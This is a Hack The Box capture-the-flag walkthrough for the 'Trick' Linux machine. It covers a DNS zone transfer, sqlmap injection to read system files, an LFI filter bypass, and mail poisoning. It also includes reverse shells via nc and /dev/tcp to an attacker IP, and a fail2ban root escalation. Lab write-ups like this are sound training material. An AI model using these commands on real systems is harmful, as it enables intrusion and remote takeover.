@@ -1,0 +1,307 @@
+                      Trick
+
+                                                                                  30th May 2022 / Document No D22.100.175
+                                                                                  Prepared By: woodenk
+                                                                                  Machine Author(s): Geiseric
+                                                                                  Difficulty: Easy
+                                                                                  Classification: Official
+
+                                  Synopsis
+
+Trick is an Easy Linux machine that features a DNS server and multiple vHost's that all require various steps
+to gain a foothold. It requires basic knowledge of DNS in order to get a domain name and then subdomain
+that can be used to access the first vHost. On the first vHost we are greeted with a Payroll Management
+System that is vulnerable to SQL Injection. Using sqlmap we find we have file privileges and can read
+system files. Reading an Nginx configuration file reveals another vHost. This vHost contains a Local File
+Inclusion (LFI) vulnerability that can be exploited. Sending a mail to one of the users with PHP code
+embedded and then including that mail with the LFI allows for Remote Code Execution (RCE). After the initial
+foothold we find a Sudo command that can be executed without a password. The command restarts the
+fail2ban service. The configuration directory of fail2ban contains a directory that is owned by a group that
+the current user is part of. The user has write access to the directory and can rename a configuration file
+and replace it with their own, which leads to Remote Code Execution as root once a ban is triggered.
+
+Skills Required
+
+      Basic DNS knowledge
+      Enumeration
+
+Skills Learned
+      DNS Zone transfer
+      Using SQL Injection to read system files
+      Exploitation of file permission misconfiguration
+
+Enumeration
+
+Nmap
+
+Let's begin by scanning for open ports using Nmap .
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.166 | grep '^[0-9]' | cut -d '/' -f 1 |
+   tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.11.166
+
+The Nmap scan reveals that ports 22 (SSH), 25 (SMTP), 53 (ISC) and 80 (Nginx) are open.
+
+Nginx
+Let's navigate to port 80 with a browser to take a look at the website.
+
+Port 80 contains a single page that is currently being built and states that "the website is coming soon".
+Nothing else of interest can immediately be found. Let's proceed to enumerating the DNS server on port 53.
+
+DNS
+
+DNS is what translates a domain name like google.com to an IP address, however, DNS can also be used to
+lookup the domain names that belong to an IP address. Using dig we can perform a reverse lookup and
+attempt to get a domain name from the DNS server.
+
+   dig @10.10.11.166 -x 10.10.11.166
+The output from dig shows the domain trick.htb . Let's add this to our hosts file.
+
+   echo '10.10.11.166 trick.htb' | sudo tee -a /etc/hosts
+
+Navigating to http://trick.htb seems to give us the same page as before. We can try to initiate a zone
+transfer and attempt to acquire other domain names associated with trick.htb .
+DNS is broken up into many different zones, a zone is a part of domain name space that is hosted and
+served by a DNS server. For example, example.com and all the subdomains it may have (eg.
+subdomain.example.com ) are a zone. A zone transfer is a request to copy an entire zone.
+
+   dig @10.10.11.166 axfr trick.htb
+The output shows a new domain name called preprod-payroll.trick.htb . Let's add this to our hosts file
+as well and visit the new host in our browser.
+
+The hostname returns a new website that features a login panel.
+
+Payroll system
+
+Looking at the HTML source code we see that the title of the page is Employee's Payroll Management
+System .
+Making a quick Google search with the keywords employee payroll management system exploits
+shows that this specific software is vulnerable to an SQL injection. In the link we see that the vulnerability
+exists in the login page and specifically in the username parameter.
+Let's fire up sqlmap to attempt to exploit this vulnerability.
+
+   sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --
+   data="username=abc&password=abc" -p username --batch
+
+The sqlmap output shows that the page is indeed vulnerable to a Time-Based SQL injection, however,
+because of the time bound nature of the vulnerability, the extraction of data is going to be very slow. Let's
+see if there are any other valid injection techniques. To do this we will use the technique flag in sqlmap to
+instruct it to use specific techniques. sqlmap has the following techniques that can be set:
+
+      B: Boolean-based blind
+      E: Error-based
+      U: Union query-based
+      S: Stacked queries
+      T: Time-based blind
+      Q: Inline queries
+Given that we don't want any slow queries we will remove T and Q and instead use BEUS as our potential
+techniques. Furthermore we want to increase the level and risk of the testing, to make sure any techniques
+are properly identified.
+
+   sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --
+   data="username=abc&password=abc" -p username --level 5 --risk 3 --technique=BEUS --
+   batch
+
+The output shows that the page is also vulnerable to boolean-based and error-based injection queries,
+which are much faster in comparison to time-based queries.
+Next, let's enumerate the privileges that the database user has.
+
+   sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --
+   data="username=abc&password=abc" -p username --privileges
+From the output we can see that the database user has been granted the FILE privilege, which means we
+can potentially read system files. Let's start by reading /etc/passwd .
+
+   sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --
+   data="username=abc&password=abc" -p username --batch --file-read=/etc/passwd
+
+The output shows the file has been saved at /home/kali/.local/share/sqlmap/output/preprod-
+payroll.trick.htb/files/_etc_passwd . Let's read it.
+
+   cat /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd
+The passwd file shows that a user called Michael exists on the remote system. Given that there was a
+vHost ( preprod-payroll.trick.htb ), we can try reading the vHost configuration of the web server.
+
+   sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --
+   data="username=abc&password=abc" -p username --batch --file-read=/etc/nginx/sites-
+   enabled/default
+
+After running the previous command we see that the file was saved locally and we can proceed to read it as
+previously shown.
+
+   cat /home/kali/.local/share/sqlmap/output/preprod-
+   payroll.trick.htb/files/_etc_nginx_sites-enabled_default
+   server {
+
+                 listen 80;
+                 listen [::]:80;
+                 server_name preprod-marketing.trick.htb;
+                 root /var/www/market;
+                 index index.php;
+
+                 location / {
+                                try_files $uri $uri/ =404;
+
+                 }
+
+                 location ~ \.php$ {
+                                include snippets/fastcgi-php.conf;
+                                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
+
+                 }
+   }
+
+   server {
+                 listen 80;
+                 listen [::]:80;
+
+                 server_name preprod-payroll.trick.htb;
+
+                 root /var/www/payroll;
+                 index index.php;
+
+                 location / {
+                                try_files $uri $uri/ =404;
+
+                 }
+
+                 location ~ \.php$ {
+                                include snippets/fastcgi-php.conf;
+                                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
+
+                 }
+   }
+
+In the configuration file we see a new vHost called preprod-marketing.trick.htb . Let's add this to our
+hosts file as well.
+
+   echo '10.10.11.166 preprod-marketing.trick.htb' | sudo tee -a /etc/hosts
+
+Marketing
+
+Having added the new domain to our hosts file we can visit the website.
+The page contains various links to other pages. Clicking on the services button takes us to a new page and
+it is worth noting that the URL in this page changes to http://preprod-marketing.trick.htb/index.php?
+page=services.html . Clicking on about takes us to a new page yet again. It also changes the URL to
+http://preprod-marketing.trick.htb/index.php?page=about.html . This could mean that the website
+uses the PHP include() function to show different pages.
+
+Consider the following PHP code.
+
+   <?php
+      // Do something if no page is requested
+      page = $_GET['page']; // Get the page parameter
+      include("/var/www/market/".page); // This includes the page that is requested
+
+   ?>
+
+If the code is similar to the above, it might be vulnerable to Local File Inclusion. Since we know the site is
+located in /var/www/market based on the Nginx vHost config, we have to go up 3 directories to try and
+read /etc/passwd , however, if we try to use ../ the page is blank. An explanation for this could be that
+there is a filter in place to prevent directory traversal where ../ simply gets removed from the input. We
+can test this by visiting the URL http://preprod-marketing.trick.htb/index.php?page=../about.html .
+
+Upon doing so, we are greeted with the usual about page, even though the page should be empty as the
+requested file does not exist. We can check once again by changing the page parameter from
+../about.html to about.html../ . Yet again, we get the about page. This probably means that ../ is
+filtered out from the URL.
+
+Given this information we can speculate that the code looks similarly to this.
+   <?php
+          //Do something if no page is requested
+          page = $_GET['page']; //Get the page parameter
+
+   include("/var/www/market/" . str_replace("../", "", $page)); // remove any ../ from the
+   parameter and include the page
+   ?>
+There is a possible way to bypass this filter with ....// . This will remove one of the ../ leaving the other
+still there. Let's try it out by going to http://preprod-marketing.trick.htb/index.php?
+page=....//....//....//....//....//etc/passwd .
+
+The page shows the /etc/passwd file, which means our payload worked.
+
+Exploitation
+
+Foothold
+
+At this point it seems like a dead end, because we have not found a way to send PHP code to a file. Looking
+back at our initial Nmap we can see that there is a SMTP server on port 25. Linux has a directory
+/var/mail/ for users to receive messages. If we can send a mail with PHP code to michael , it will appear
+in /var/mail/michael . To connect and send our malicious mail we will be using netcat .
+
+   nc trick.htb 25
+In the commands used above, we send an email to the mail server listening on port 25.
+helo x is a command to open/"greet" to the server, mail from: gives the server the name of the sender,
+whilst rcpt to: gives the name of the recipient. data notifies the server that the following data will be the
+main message of the mail and the server ends the data with <CR><LF>.<CR><LF> , which is a . in between
+two new lines. We give our PHP shell as the data and end off with a dot.
+
+Let's start a netcat listener on port 1337 .
+
+   nc -lvnp 1337
+
+After starting a listener, we try to execute a reverse shell on the system using the Local File Inclusion
+vulnerability, by visiting the URL http://preprod-marketing.trick.htb/index.php?
+page=....//....//....//....//....//....//var/mail/michael&cmd=nc%2010.10.14.29%201337%20-
+e%20/bin/sh .
+
+Using the previous URL the website will read the file /var/mail/michael which contains our malicious PHP
+code and include it in it's own source. The code will get the cmd parameter and execute it as a system
+command. The parameter is set to nc%2010.10.14.29%201337%20-e%20/bin/sh , which is nc 10.10.14.29
+1337 -e /bin/sh without URL encoding. Visiting the URL sends a reverse shell to our netcat listener.
+After the initial foothold, we quickly find an SSH key in michael's home directory, which we can use for
+easier access to the system. We copy it over to our system, and change the permissions of the file using
+chmod .
+
+   chmod 600 id_rsa
+   ssh -i id_rsa michael@trick.htb
+
+We also take note of the security group that the user michael is in.
+
+Privilege Escalation
+
+Once logged in, let's check for sudo commands that we are allowed to run.
+
+   sudo -l
+The output shows that we can restart the fail2ban service as the root user. Let's check the configuration
+of fail2ban to see if we can find anything of interest.
+
+   cd /etc/fail2ban
+   ls -la
+
+We see that the directory action.d is owned by the group security , which we are a member of. The
+permissions are also set to rwxrwx--- , which means that the security group has Read,Write and eXecute
+permissions on this folder. Going inside the action.d directory we take a look at the files inside.
+
+   ls -l
+The file we are looking for is iptables-multiport.conf , specifically one line in particular. We are looking
+for actionban which contains the command that is being run if a user is banned.
+
+   cat iptables-multiport.conf
+
+The previously mentioned variable is what we want to change. However, we don't have write access to that
+file, nor is it owned by anything we can access. Yet, the directory is owned by security , which means we
+can move files and replace them.
+
+   mv iptables-multiport.conf .old
+   cp .old iptables-multiport.conf
+   ls -l iptables-multiport.conf
+As shown in the output we now have full control over iptables-multiport.conf . We edit the
+configuration file and change the actionban variable to actionban = /tmp/shell.sh . Afterwards we
+create a file at /tmp/shell.sh with the following contents.
+
+   #!/bin/bash
+   bash -i >& /dev/tcp/10.10.14.29/1337 0>&1
+We also make it executable with chmod .
+   chmod +x /tmp/shell.sh
+Finally, let's try restarting fail2ban using sudo.
+   sudo /etc/init.d/fail2ban restart
+
+All that is left is starting a netcat listener and triggering the ban command. Let's start our netcat listener
+first.
+
+   nc -lvnp 1337
+Next, let's try to trigger the ban by trying to log in with incorrect credentials. We can simply use SSH and hit
+enter a few times.
+
+   ssh michael@trick.htb
+After a short period we receive a reverse shell on our netcat listener.
+
